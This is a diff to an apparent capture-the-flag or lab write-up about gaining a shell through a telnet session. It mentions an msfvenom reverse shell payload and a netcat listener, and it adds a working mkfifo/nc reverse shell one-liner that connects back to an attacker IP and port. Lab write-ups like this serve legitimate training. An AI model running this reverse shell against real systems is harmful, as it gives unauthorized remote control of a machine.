@@ -36,3 +36,8 @@ We're going to generate a reverse shell payload using msfvenom.This will generat
 `nc -lvp [listening port]`
 
 after that we copy and paste our msfvenom payload into the telnet session and run it as a command to get a shell.
+
+`.RUN mkfifo /tmp/qdym; nc 10.13.65.129 44444 0</tmp/qdym | /bin/sh >/tmp/qdym 2>&1; rm /tmp/qdym` was run in the telnet session, then:
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
